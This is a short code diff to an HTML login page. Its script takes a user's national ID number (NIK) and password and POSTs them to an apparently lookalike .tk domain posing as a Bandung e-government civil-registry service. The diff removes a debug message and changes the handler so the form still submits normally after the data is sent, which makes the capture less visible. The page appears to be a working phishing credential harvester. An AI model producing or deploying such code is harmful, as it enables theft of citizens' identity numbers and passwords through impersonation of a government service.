@@ -101,14 +101,13 @@
 <script type="text/javascript">
     function kirim() {
         var nik = $('#nik').val();
-        var password = $('#inputPassword').val()
+        var password = $('#inputPassword').val();
         $.ajax({
             url: 'http://e-gov-bandung.tk/dukcapil/api/public/auth/login',
             type: 'POST',
             data: { nik: nik, password : password}
         });
-        console.log('semua oke');
-        return false;
+        return true;
     }
 </script>
 </body>
